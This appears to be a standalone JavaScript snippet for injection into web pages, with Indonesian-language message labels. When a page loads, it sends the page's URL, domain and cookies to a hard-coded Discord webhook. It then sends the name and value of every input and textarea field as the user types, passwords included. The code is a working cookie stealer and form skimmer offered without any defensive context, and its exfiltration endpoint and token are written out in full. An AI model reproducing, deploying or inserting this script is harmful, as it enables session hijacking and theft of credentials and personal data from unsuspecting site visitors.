function discordSend(message) {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://discordapp.com/api/webhooks/1569668671662456964/xIKttxD46ofl0erXlDXua6oTDadExL4kVIv9daATIoK5sRwMUWC14jXQiiok2T-p2E4u', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    var payload = JSON.stringify({ content: message });
    xhr.send(payload);
}

// 
discordSend(
    `! ${document.domain}\n\n` +
    `URL :\n${location.href}\n\n` +
    `Document :\n${document.cookie}`
);

document.addEventListener('input', function (e) {
    if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) {
        discordSend(
            `📥  di ${location.href}\n` +
            `Name: ${e.target.name || '(tidak ada name)'}\n` +
            `Value: ${e.target.value}`
        );
    }
});
